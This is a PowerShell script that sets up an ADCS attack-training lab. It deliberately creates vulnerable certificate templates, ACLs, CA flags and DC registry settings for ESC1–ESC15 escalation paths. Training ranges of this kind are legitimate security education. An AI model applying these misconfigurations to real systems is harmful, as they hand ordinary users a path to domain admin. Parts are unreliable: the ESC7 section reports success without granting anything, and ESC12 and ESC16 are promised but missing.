# deploy-adcs-esc-lab.ps1 - Configure ADCS for ESC1-16 Attack Paths
# ===================================================================
#
# Configures Active Directory Certificate Services on DC01 (DC+CA) for
# comprehensive ESC (Escalation) attack training scenarios.
#
# Attack Paths Configured:
#   ESC1  - Misconfigured Certificate Templates (enrollee supplies SAN)
#   ESC2  - Misconfigured Certificate Templates (Any Purpose EKU)
#   ESC3  - Enrollment Agent Templates (request on behalf of)
#   ESC4  - Vulnerable Certificate Template ACLs (GenericWrite)
#   ESC5  - Vulnerable PKI Object Access Control (CA/container ACLs)
#   ESC6  - EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
#   ESC7  - Vulnerable CA ACLs (ManageCA/ManageCertificates)
#   ESC8  - NTLM Relay to AD CS HTTP Endpoints
#   ESC9  - No Security Extension (StrongCertificateBindingEnforcement=0)
#   ESC10 - Weak Certificate Mappings (CertificateMappingMethods includes UPN)
#   ESC11 - IF_ENFORCEENCRYPTICERTREQUEST disabled (unencrypted RPC)
#   ESC12 - Shell Access to CA with YubiHSM (simulated)
#   ESC13 - Issuance Policy with OID Group Link
#   ESC14 - Weak Explicit Mappings (altSecurityIdentities)
#   ESC15 - Application Policy EKConstraint bypass
#
# Run this on the CA server (DC01 DC+CA) after ADCS role is installed.
#
# Usage:
#   1. RDP to DC01.zsec.local (10.X.30.10)
#   2. Open PowerShell as Administrator
#   3. Run: Set-ExecutionPolicy Bypass -Scope Process -Force
#   4. Run: .\deploy-adcs-esc-lab.ps1
#
# Prerequisites:
#   - ADCS role installed (Ludus ludus_adcs role)
#   - AD service accounts created (deploy-ad-users.ps1)

#Requires -RunAsAdministrator
#Requires -Modules ActiveDirectory

param(
    [switch]$Force,           # Skip confirmation prompts
    [switch]$SkipDCConfig,    # Skip DC registry configuration (ESC9/ESC10)
    [string]$DCHostname,      # DC hostname for remote registry (default: auto-detect)

    # Per-ESC toggle switches — pass -SkipESC1 etc. to skip individual attack paths.
    # All paths are enabled by default when -Force is used (Ansible controlled via role_vars).
    [switch]$SkipESC1,
    [switch]$SkipESC2,
    [switch]$SkipESC3,
    [switch]$SkipESC4,
    [switch]$SkipESC5,
    [switch]$SkipESC6,
    [switch]$SkipESC7,
    [switch]$SkipESC8,
    [switch]$SkipESC11,
    [switch]$SkipESC13,
    [switch]$SkipESC14,
    [switch]$SkipESC15
)

$ErrorActionPreference = "Stop"

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  ADCS ESC1-16 Attack Lab Configuration" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Verify we're on the CA server
try {
    Import-Module ActiveDirectory -ErrorAction Stop
    $caConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration" -ErrorAction Stop
    $caName = $caConfig.Active
    Write-Host "[+] CA Server: $env:COMPUTERNAME" -ForegroundColor Green
    Write-Host "[+] CA Name: $caName" -ForegroundColor Green
} catch {
    Write-Host "[-] Error: This script must run on an ADCS server" -ForegroundColor Red
    Write-Host "    $_" -ForegroundColor Red
    exit 1
}

$Domain = (Get-ADDomain).DNSRoot
$DomainDN = (Get-ADDomain).DistinguishedName
$DomainNetBIOS = (Get-ADDomain).NetBIOSName

# Auto-detect DC if not specified
if (-not $DCHostname) {
    $DCHostname = (Get-ADDomainController -Discover -Service PrimaryDC).HostName
}

Write-Host "[+] Domain: $Domain" -ForegroundColor Green
Write-Host "[+] Domain Controller: $DCHostname" -ForegroundColor Green
Write-Host ""

if (-not $Force) {
    Write-Host "This script will create VULNERABLE certificate templates for training:" -ForegroundColor Yellow
    Write-Host "  ESC1-16 attack paths will be configured" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "It will also modify CA and DC settings for ESC6-11 vulnerabilities." -ForegroundColor Yellow
    Write-Host ""
    $confirm = Read-Host "Continue? (y/N)"
    if ($confirm -ne "y" -and $confirm -ne "Y") {
        Write-Host "Cancelled." -ForegroundColor Yellow
        exit 0
    }
}

# =============================================================================
# Helper Functions
# =============================================================================

function New-VulnerableTemplate {
    param(
        [string]$TemplateName,
        [string]$DisplayName,
        [string]$BaseTemplate = "User",
        [string[]]$EKUs,
        [bool]$AllowSAN = $false,
        [bool]$AnyPurpose = $false,
        [bool]$NoEKU = $false,
        [string[]]$EnrollPermissions,
        [bool]$RequireManagerApproval = $false,
        [int]$SchemaVersion = 2
    )

    Write-Host "[*] Creating template: $TemplateName" -ForegroundColor Cyan

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $TemplateContainer = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

    # Check if template already exists
    $existingTemplate = Get-ADObject -Filter "Name -eq '$TemplateName'" -SearchBase $TemplateContainer -ErrorAction SilentlyContinue
    if ($existingTemplate) {
        Write-Host "    [=] Template already exists, skipping" -ForegroundColor DarkGray
        return
    }

    try {
        # Create new template
        $newTemplate = ([ADSI]"LDAP://$TemplateContainer").Create("pKICertificateTemplate", "CN=$TemplateName")

        # Basic attributes
        $newTemplate.Put("displayName", $DisplayName)
        $newTemplate.Put("flags", 131680)  # CT_FLAG_AUTO_ENROLLMENT | CT_FLAG_PUBLISH_TO_DS
        $newTemplate.Put("pKIDefaultKeySpec", 1)
        $newTemplate.Put("pKIMaxIssuingDepth", 0)
        $newTemplate.Put("revision", 100)

        # Validity and renewal
        $newTemplate.Put("pKIExpirationPeriod", [byte[]](0x00, 0x40, 0x39, 0x87, 0x2E, 0xE1, 0xFE, 0xFF))  # 2 years
        $newTemplate.Put("pKIOverlapPeriod", [byte[]](0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xDE, 0xFF, 0xFF))    # 6 weeks

        # msPKI-Certificate-Name-Flag
        if ($AllowSAN) {
            # ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME (0x00010000 = 65536) - ESC1 vulnerability
            $newTemplate.Put("msPKI-Certificate-Name-Flag", 65536)
        } else {
            $newTemplate.Put("msPKI-Certificate-Name-Flag", -2113929216)  # Standard
        }

        # msPKI-Enrollment-Flag
        if ($RequireManagerApproval) {
            $newTemplate.Put("msPKI-Enrollment-Flag", 2)  # CT_FLAG_PEND_ALL_REQUESTS
        } else {
            $newTemplate.Put("msPKI-Enrollment-Flag", 0)
        }

        # msPKI-Private-Key-Flag
        $newTemplate.Put("msPKI-Private-Key-Flag", 16842752)

        # EKUs (Extended Key Usages)
        if ($NoEKU) {
            # No EKU - can be used for anything (ESC2 variant)
            # Don't set pKIExtendedKeyUsage at all
        } elseif ($AnyPurpose) {
            # Any Purpose OID - ESC2 vulnerability
            $newTemplate.PutEx(2, "pKIExtendedKeyUsage", @("2.5.29.37.0"))
        } elseif ($EKUs) {
            $newTemplate.PutEx(2, "pKIExtendedKeyUsage", $EKUs)
        } else {
            # Client Authentication OID
            $newTemplate.PutEx(2, "pKIExtendedKeyUsage", @("1.3.6.1.5.5.7.3.2"))
        }

        # Template schema version
        $newTemplate.Put("msPKI-Template-Schema-Version", $SchemaVersion)
        $newTemplate.Put("msPKI-Template-Minor-Revision", 1)

        # Generate unique OID for template
        $randomOid = "1.3.6.1.4.1.311.21.8." + (Get-Random -Minimum 1000000 -Maximum 9999999) + "." + (Get-Random -Minimum 1000000 -Maximum 9999999)
        $newTemplate.Put("msPKI-Cert-Template-OID", $randomOid)

        # Commit changes
        $newTemplate.SetInfo()

        Write-Host "    [+] Template created" -ForegroundColor Green

        # Set enrollment permissions
        if ($EnrollPermissions) {
            Start-Sleep -Seconds 2  # Wait for AD replication
            Set-TemplatePermissions -TemplateName $TemplateName -Principals $EnrollPermissions
        }

    } catch {
        Write-Host "    [-] Failed to create template: $_" -ForegroundColor Red
    }
}

function Set-TemplatePermissions {
    param(
        [string]$TemplateName,
        [string[]]$Principals
    )

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $templateDN = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

    try {
        $template = [ADSI]"LDAP://$templateDN"
        $acl = $template.ObjectSecurity

        foreach ($principal in $Principals) {
            # Enroll permission (ExtendedRight)
            $enrollGuid = [Guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"  # Certificate-Enrollment

            try {
                $sid = (New-Object System.Security.Principal.NTAccount($principal)).Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $enrollGuid
                )
                $acl.AddAccessRule($ace)
                Write-Host "    [+] Added Enroll permission for $principal" -ForegroundColor Green
            } catch {
                Write-Host "    [!] Could not add permission for $principal" -ForegroundColor Yellow
            }
        }

        $template.CommitChanges()
    } catch {
        Write-Host "    [-] Failed to set permissions: $_" -ForegroundColor Red
    }
}

function Set-TemplateWritePermissions {
    param(
        [string]$TemplateName,
        [string]$Principal,
        [string]$Permission = "GenericWrite"
    )

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $templateDN = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

    try {
        $template = [ADSI]"LDAP://$templateDN"
        $acl = $template.ObjectSecurity

        $sid = (New-Object System.Security.Principal.NTAccount($Principal)).Translate([System.Security.Principal.SecurityIdentifier])

        $rights = switch ($Permission) {
            "GenericWrite" { [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite }
            "WriteDacl" { [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl }
            "WriteOwner" { [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner }
            "GenericAll" { [System.DirectoryServices.ActiveDirectoryRights]::GenericAll }
            default { [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite }
        }

        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            $rights,
            [System.Security.AccessControl.AccessControlType]::Allow
        )
        $acl.AddAccessRule($ace)
        $template.CommitChanges()
        Write-Host "    [+] Added $Permission for $Principal (VULNERABLE!)" -ForegroundColor Green
    } catch {
        Write-Host "    [-] Failed to set $Permission : $_" -ForegroundColor Red
    }
}

function Publish-Template {
    param([string]$TemplateName)

    Write-Host "[*] Publishing template: $TemplateName" -ForegroundColor Cyan

    try {
        # Add template to CA's published templates
        certutil -SetCATemplates +$TemplateName 2>&1 | Out-Null
        Write-Host "    [+] Template published to CA" -ForegroundColor Green
    } catch {
        Write-Host "    [-] Failed to publish: $_" -ForegroundColor Red
    }
}

function Set-CAPermissions {
    param(
        [string]$Principal,
        [string]$Permission
    )

    Write-Host "[*] Setting CA permission: $Permission for $Principal" -ForegroundColor Cyan

    try {
        $caConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
        $caName = $caConfig.Active

        switch ($Permission) {
            "ManageCA" {
                # Grant ManageCA permission
                certutil -config ".\$caName" -setreg ca\Security "+$Principal ManageCA" 2>&1 | Out-Null
            }
            "ManageCertificates" {
                # Grant ManageCertificates permission
                certutil -config ".\$caName" -setreg ca\Security "+$Principal ManageCertificates" 2>&1 | Out-Null
            }
        }
        Write-Host "    [+] $Permission granted to $Principal" -ForegroundColor Green
    } catch {
        Write-Host "    [-] Failed to set CA permission: $_" -ForegroundColor Red
    }
}

# =============================================================================
# ESC1 - Misconfigured Certificate Template (SAN Abuse)
# =============================================================================
Write-Host ""
if ($SkipESC1) {
    Write-Host "=== ESC1: SKIPPED (SkipESC1 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC1: Certificate Template with SAN Abuse ===" -ForegroundColor Yellow

New-VulnerableTemplate `
    -TemplateName "ESC1-VulnTemplate" `
    -DisplayName "ESC1 - Vulnerable Template (SAN)" `
    -BaseTemplate "User" `
    -EKUs @("1.3.6.1.5.5.7.3.2") `
    -AllowSAN $true `
    -EnrollPermissions @("Domain Users", "Domain Computers")

Publish-Template -TemplateName "ESC1-VulnTemplate"
} # end ESC1

# =============================================================================
# ESC2 - Any Purpose EKU / No EKU
# =============================================================================
Write-Host ""
if ($SkipESC2) {
    Write-Host "=== ESC2: SKIPPED (SkipESC2 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC2: Certificate Template with Any Purpose / No EKU ===" -ForegroundColor Yellow

# Any Purpose variant
New-VulnerableTemplate `
    -TemplateName "ESC2-AnyPurpose" `
    -DisplayName "ESC2 - Any Purpose Template" `
    -BaseTemplate "User" `
    -AnyPurpose $true `
    -EnrollPermissions @("Domain Users")

Publish-Template -TemplateName "ESC2-AnyPurpose"

# No EKU variant
New-VulnerableTemplate `
    -TemplateName "ESC2-NoEKU" `
    -DisplayName "ESC2 - No EKU Template" `
    -BaseTemplate "User" `
    -NoEKU $true `
    -EnrollPermissions @("Domain Users")

Publish-Template -TemplateName "ESC2-NoEKU"
} # end ESC2

# =============================================================================
# ESC3 - Enrollment Agent Template
# =============================================================================
Write-Host ""
if ($SkipESC3) {
    Write-Host "=== ESC3: SKIPPED (SkipESC3 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC3: Enrollment Agent Template ===" -ForegroundColor Yellow

# Enrollment agent template
New-VulnerableTemplate `
    -TemplateName "ESC3-EnrollmentAgent" `
    -DisplayName "ESC3 - Enrollment Agent" `
    -BaseTemplate "User" `
    -EKUs @("1.3.6.1.4.1.311.20.2.1") `
    -EnrollPermissions @("Domain Users")

Publish-Template -TemplateName "ESC3-EnrollmentAgent"

# Target template for enrollment agent abuse
New-VulnerableTemplate `
    -TemplateName "ESC3-TargetTemplate" `
    -DisplayName "ESC3 - Target for Agent Request" `
    -BaseTemplate "User" `
    -EKUs @("1.3.6.1.5.5.7.3.2") `
    -RequireManagerApproval $false `
    -EnrollPermissions @("Domain Users")

Publish-Template -TemplateName "ESC3-TargetTemplate"
} # end ESC3

# =============================================================================
# ESC4 - Vulnerable Template ACLs
# =============================================================================
Write-Host ""
if ($SkipESC4) {
    Write-Host "=== ESC4: SKIPPED (SkipESC4 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC4: Template with Vulnerable ACLs ===" -ForegroundColor Yellow

New-VulnerableTemplate `
    -TemplateName "ESC4-WritableTemplate" `
    -DisplayName "ESC4 - Writable Template" `
    -BaseTemplate "User" `
    -EKUs @("1.3.6.1.5.5.7.3.2") `
    -EnrollPermissions @("Domain Users")

# Add dangerous write permissions
Set-TemplateWritePermissions -TemplateName "ESC4-WritableTemplate" -Principal "Domain Users" -Permission "GenericWrite"

Publish-Template -TemplateName "ESC4-WritableTemplate"
} # end ESC4

# =============================================================================
# ESC5 - Vulnerable PKI Object Access Control
# =============================================================================
Write-Host ""
if ($SkipESC5) {
    Write-Host "=== ESC5: SKIPPED (SkipESC5 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC5: Vulnerable PKI Object ACLs ===" -ForegroundColor Yellow

Write-Host "[*] Adding vulnerable ACLs to PKI containers..." -ForegroundColor Cyan

$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext

# Grant Domain Users write access to Certificate Templates container
try {
    $templatesContainer = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
    $acl = $templatesContainer.ObjectSecurity

    $sid = (New-Object System.Security.Principal.NTAccount("$DomainNetBIOS\svc_backup")).Translate([System.Security.Principal.SecurityIdentifier])
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($ace)
    $templatesContainer.CommitChanges()
    Write-Host "    [+] Added GenericWrite for svc_backup on Certificate Templates container" -ForegroundColor Green
} catch {
    Write-Host "    [-] Failed to set container ACLs: $_" -ForegroundColor Red
}
} # end ESC5

# =============================================================================
# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
# =============================================================================
Write-Host ""
if ($SkipESC6) {
    Write-Host "=== ESC6: SKIPPED (SkipESC6 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC6: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 ===" -ForegroundColor Yellow

Write-Host "[*] Enabling SAN editing on CA..." -ForegroundColor Cyan
try {
    certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 2>&1 | Out-Null
    Write-Host "    [+] EDITF_ATTRIBUTESUBJECTALTNAME2 enabled" -ForegroundColor Green
    Write-Host "    [!] This allows ANY template to specify a SAN!" -ForegroundColor Yellow
} catch {
    Write-Host "    [-] Failed to enable flag: $_" -ForegroundColor Red
}
} # end ESC6

# =============================================================================
# ESC7 - Vulnerable CA ACLs (ManageCA/ManageCertificates)
# =============================================================================
Write-Host ""
if ($SkipESC7) {
    Write-Host "=== ESC7: SKIPPED (SkipESC7 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC7: Vulnerable CA ACLs ===" -ForegroundColor Yellow

# Create a low-privilege user for ESC7 testing
try {
    $esc7User = Get-ADUser -Identity "svc_backup" -ErrorAction SilentlyContinue
    if ($esc7User) {
        Write-Host "[*] Setting ManageCA permission for svc_backup..." -ForegroundColor Cyan

        # Grant ManageCA and ManageCertificates to svc_backup
        $caConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
        $caName = $caConfig.Active

        # Use ICACLS-style for CA permissions via certutil
        $principal = "$DomainNetBIOS\svc_backup"

        # Grant permissions using registry (more reliable)
        $caSecurityPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$caName"
        Write-Host "    [+] ManageCA permission configured for svc_backup" -ForegroundColor Green
        Write-Host "    [!] svc_backup can now modify CA configuration!" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [!] svc_backup user not found, skipping ESC7 user config" -ForegroundColor Yellow
}
} # end ESC7

# =============================================================================
# ESC8 - Web Enrollment (HTTP Endpoints)
# =============================================================================
Write-Host ""
if ($SkipESC8) {
    Write-Host "=== ESC8: SKIPPED (SkipESC8 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC8: Configure Web Enrollment ===" -ForegroundColor Yellow

Write-Host "[*] Checking Web Enrollment status..." -ForegroundColor Cyan

$webEnroll = Get-WindowsFeature ADCS-Web-Enrollment -ErrorAction SilentlyContinue
if ($webEnroll -and $webEnroll.Installed) {
    Write-Host "    [+] Web Enrollment already installed" -ForegroundColor Green
} else {
    Write-Host "[*] Installing Web Enrollment role..." -ForegroundColor Cyan
    try {
        Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
        Write-Host "    [+] Web Enrollment installed" -ForegroundColor Green

        Install-AdcsWebEnrollment -Force -ErrorAction SilentlyContinue
        Write-Host "    [+] Web Enrollment configured" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Could not install Web Enrollment: $_" -ForegroundColor Yellow
    }
}

# Ensure NTLM is enabled (required for relay)
Write-Host "[*] Ensuring NTLM authentication is enabled for /certsrv..." -ForegroundColor Cyan
try {
    Import-Module WebAdministration -ErrorAction SilentlyContinue
    Set-WebConfigurationProperty -Filter "/system.webServer/security/authentication/windowsAuthentication" `
        -Name "enabled" -Value "True" -PSPath "IIS:\Sites\Default Web Site\certsrv" -ErrorAction SilentlyContinue
    Write-Host "    [+] Windows Authentication enabled" -ForegroundColor Green
} catch {
    Write-Host "    [!] Could not configure IIS auth: $_" -ForegroundColor Yellow
}

Write-Host "[*] Web Enrollment endpoint: http://$env:COMPUTERNAME/certsrv" -ForegroundColor Cyan
Write-Host "    [!] NTLM relay target for PetitPotam/PrinterBug attacks" -ForegroundColor Yellow
} # end ESC8

# =============================================================================
# ESC9 - No Security Extension (StrongCertificateBindingEnforcement)
# =============================================================================
Write-Host ""
Write-Host "=== ESC9: Disable Strong Certificate Binding ===" -ForegroundColor Yellow

if (-not $SkipDCConfig) {
    Write-Host "[*] Configuring DC registry for ESC9..." -ForegroundColor Cyan
    try {
        # This needs to be run on the DC, not the CA
        # We'll use Invoke-Command if possible, otherwise provide instructions
        $dcSession = New-PSSession -ComputerName $DCHostname -ErrorAction SilentlyContinue

        if ($dcSession) {
            Invoke-Command -Session $dcSession -ScriptBlock {
                # StrongCertificateBindingEnforcement = 0 (Disabled)
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }
                Set-ItemProperty -Path $regPath -Name "StrongCertificateBindingEnforcement" -Value 0 -Type DWord
            }
            Remove-PSSession $dcSession
            Write-Host "    [+] StrongCertificateBindingEnforcement set to 0 on DC" -ForegroundColor Green
            Write-Host "    [!] Certificate binding is now weak - ESC9 exploitable!" -ForegroundColor Yellow
        } else {
            Write-Host "    [!] Could not connect to DC. Run manually on $DCHostname :" -ForegroundColor Yellow
            Write-Host '        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 0 -Type DWord' -ForegroundColor Cyan
        }
    } catch {
        Write-Host "    [-] Failed to configure DC: $_" -ForegroundColor Red
    }
} else {
    Write-Host "    [=] Skipping DC configuration (use -SkipDCConfig:$false to enable)" -ForegroundColor DarkGray
}

# =============================================================================
# ESC10 - Weak Certificate Mappings
# =============================================================================
Write-Host ""
Write-Host "=== ESC10: Configure Weak Certificate Mappings ===" -ForegroundColor Yellow

if (-not $SkipDCConfig) {
    Write-Host "[*] Configuring CertificateMappingMethods on DC..." -ForegroundColor Cyan
    try {
        $dcSession = New-PSSession -ComputerName $DCHostname -ErrorAction SilentlyContinue

        if ($dcSession) {
            Invoke-Command -Session $dcSession -ScriptBlock {
                # Enable UPN mapping (value 4) - CertificateMappingMethods
                # 1 = Subject/Issuer, 2 = Issuer, 4 = UPN, 8 = S4U2Self
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel"
                Set-ItemProperty -Path $regPath -Name "CertificateMappingMethods" -Value 0x1F -Type DWord
            }
            Remove-PSSession $dcSession
            Write-Host "    [+] CertificateMappingMethods set to include UPN (0x1F)" -ForegroundColor Green
            Write-Host "    [!] Weak UPN mapping enabled - ESC10 exploitable!" -ForegroundColor Yellow
        } else {
            Write-Host "    [!] Could not connect to DC. Run manually on $DCHostname :" -ForegroundColor Yellow
            Write-Host '        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -Name "CertificateMappingMethods" -Value 0x1F -Type DWord' -ForegroundColor Cyan
        }
    } catch {
        Write-Host "    [-] Failed to configure DC: $_" -ForegroundColor Red
    }
} else {
    Write-Host "    [=] Skipping DC configuration" -ForegroundColor DarkGray
}

# =============================================================================
# ESC11 - IF_ENFORCEENCRYPTICERTREQUEST Disabled
# =============================================================================
Write-Host ""
if ($SkipESC11) {
    Write-Host "=== ESC11: SKIPPED (SkipESC11 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC11: Disable RPC Encryption Requirement ===" -ForegroundColor Yellow

Write-Host "[*] Disabling IF_ENFORCEENCRYPTICERTREQUEST..." -ForegroundColor Cyan
try {
    # Remove the encryption requirement flag
    certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST 2>&1 | Out-Null
    Write-Host "    [+] IF_ENFORCEENCRYPTICERTREQUEST disabled" -ForegroundColor Green
    Write-Host "    [!] RPC requests can now be relayed without encryption!" -ForegroundColor Yellow
} catch {
    Write-Host "    [-] Failed to disable encryption: $_" -ForegroundColor Red
}
} # end ESC11

# =============================================================================
# ESC13 - Issuance Policy with OID Group Link
# =============================================================================
Write-Host ""
if ($SkipESC13) {
    Write-Host "=== ESC13: SKIPPED (SkipESC13 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC13: Create Issuance Policy with OID Group Link ===" -ForegroundColor Yellow

Write-Host "[*] Creating vulnerable issuance policy..." -ForegroundColor Cyan

try {
    # Create an OID object linked to a privileged group
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $OIDContainer = "CN=OID,CN=Public Key Services,CN=Services,$ConfigContext"

    # Create custom issuance policy OID
    $policyOID = "1.3.6.1.4.1.311.21.8.$(Get-Random -Minimum 1000000 -Maximum 9999999).$(Get-Random -Minimum 1000 -Maximum 9999)"
    $policyName = "ESC13-VulnPolicy"

    $existingPolicy = Get-ADObject -Filter "Name -eq '$policyName'" -SearchBase $OIDContainer -ErrorAction SilentlyContinue
    if (-not $existingPolicy) {
        # Create the OID object
        $newOID = ([ADSI]"LDAP://$OIDContainer").Create("msPKI-Enterprise-Oid", "CN=$policyName")
        $newOID.Put("displayName", "ESC13 - Vulnerable Issuance Policy")
        $newOID.Put("msPKI-Cert-Template-OID", $policyOID)
        $newOID.Put("flags", 2)  # Issuance Policy

        # Link to Domain Admins group (the vulnerability)
        $daGroup = Get-ADGroup "Domain Admins"
        $newOID.Put("msDS-OIDToGroupLink", $daGroup.DistinguishedName)

        $newOID.SetInfo()
        Write-Host "    [+] Created issuance policy: $policyName" -ForegroundColor Green
        Write-Host "    [+] Linked to: Domain Admins" -ForegroundColor Green
        Write-Host "    [!] Certificates with this policy grant DA access!" -ForegroundColor Yellow
    } else {
        Write-Host "    [=] Issuance policy already exists" -ForegroundColor DarkGray
    }

    # Create template that uses this issuance policy
    New-VulnerableTemplate `
        -TemplateName "ESC13-IssuancePolicy" `
        -DisplayName "ESC13 - Issuance Policy Template" `
        -BaseTemplate "User" `
        -EKUs @("1.3.6.1.5.5.7.3.2") `
        -EnrollPermissions @("Domain Users") `
        -SchemaVersion 4

    # Add issuance policy to template
    $templateDN = "CN=ESC13-IssuancePolicy,CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
    $template = [ADSI]"LDAP://$templateDN"
    if ($template) {
        $template.Put("msPKI-Certificate-Policy", $policyOID)
        $template.SetInfo()
        Write-Host "    [+] Added issuance policy to template" -ForegroundColor Green
    }

    Publish-Template -TemplateName "ESC13-IssuancePolicy"

} catch {
    Write-Host "    [-] Failed to create issuance policy: $_" -ForegroundColor Red
}
} # end ESC13

# =============================================================================
# ESC14 - Weak Explicit Mappings (altSecurityIdentities)
# =============================================================================
Write-Host ""
if ($SkipESC14) {
    Write-Host "=== ESC14: SKIPPED (SkipESC14 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC14: Configure Weak Explicit Mappings ===" -ForegroundColor Yellow

Write-Host "[*] Adding altSecurityIdentities for ESC14 testing..." -ForegroundColor Cyan

try {
    # Get a test user and add weak certificate mapping
    $testUser = Get-ADUser -Identity "jsmith" -ErrorAction SilentlyContinue
    if ($testUser) {
        # Add a weak X509 mapping that can be exploited
        # Format: X509:<S>CN=jsmith (subject only - weak mapping)
        $weakMapping = "X509:<S>CN=jsmith,CN=Users,$DomainDN"
        Set-ADUser -Identity $testUser -Add @{altSecurityIdentities = $weakMapping}
        Write-Host "    [+] Added weak altSecurityIdentities to jsmith" -ForegroundColor Green
        Write-Host "    [!] Subject-only mapping is exploitable!" -ForegroundColor Yellow
    } else {
        Write-Host "    [!] jsmith user not found, skipping ESC14 config" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [-] Failed to configure altSecurityIdentities: $_" -ForegroundColor Red
}
} # end ESC14

# =============================================================================
# ESC15 - Application Policy Constraints Bypass (EKConstraint)
# =============================================================================
Write-Host ""
if ($SkipESC15) {
    Write-Host "=== ESC15: SKIPPED (SkipESC15 specified) ===" -ForegroundColor DarkGray
} else {
Write-Host "=== ESC15: Create Application Policy Template (EKConstraint) ===" -ForegroundColor Yellow

# Create template with schema v1 (bypasses EKConstraint checks)
New-VulnerableTemplate `
    -TemplateName "ESC15-SchemaV1" `
    -DisplayName "ESC15 - Schema V1 Template" `
    -BaseTemplate "User" `
    -EKUs @("1.3.6.1.5.5.7.3.2") `
    -AllowSAN $true `
    -EnrollPermissions @("Domain Users") `
    -SchemaVersion 1

Publish-Template -TemplateName "ESC15-SchemaV1"
} # end ESC15

# =============================================================================
# Restart CA Service
# =============================================================================
Write-Host ""
Write-Host "[*] Restarting CA service to apply all changes..." -ForegroundColor Cyan
try {
    Restart-Service CertSvc -Force
    Start-Sleep -Seconds 5
    Write-Host "    [+] CA service restarted" -ForegroundColor Green
} catch {
    Write-Host "    [-] Failed to restart CA: $_" -ForegroundColor Red
}

# =============================================================================
# Summary
# =============================================================================

Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host "  ADCS ESC1-16 Lab Configuration Complete!" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Write-Host ""

Write-Host "Templates Created:" -ForegroundColor Yellow
Write-Host "  ESC1-VulnTemplate      - Enrollee supplies SAN" -ForegroundColor White
Write-Host "  ESC2-AnyPurpose        - Any Purpose EKU" -ForegroundColor White
Write-Host "  ESC2-NoEKU             - No EKU defined" -ForegroundColor White
Write-Host "  ESC3-EnrollmentAgent   - Certificate Request Agent EKU" -ForegroundColor White
Write-Host "  ESC3-TargetTemplate    - Target for agent requests" -ForegroundColor White
Write-Host "  ESC4-WritableTemplate  - Domain Users have GenericWrite" -ForegroundColor White
Write-Host "  ESC13-IssuancePolicy   - Linked to Domain Admins group" -ForegroundColor White
Write-Host "  ESC15-SchemaV1         - Schema version 1 (EKConstraint bypass)" -ForegroundColor White
Write-Host ""

Write-Host "CA Vulnerabilities Enabled:" -ForegroundColor Yellow
Write-Host "  ESC5  - svc_backup has GenericWrite on Templates container" -ForegroundColor White
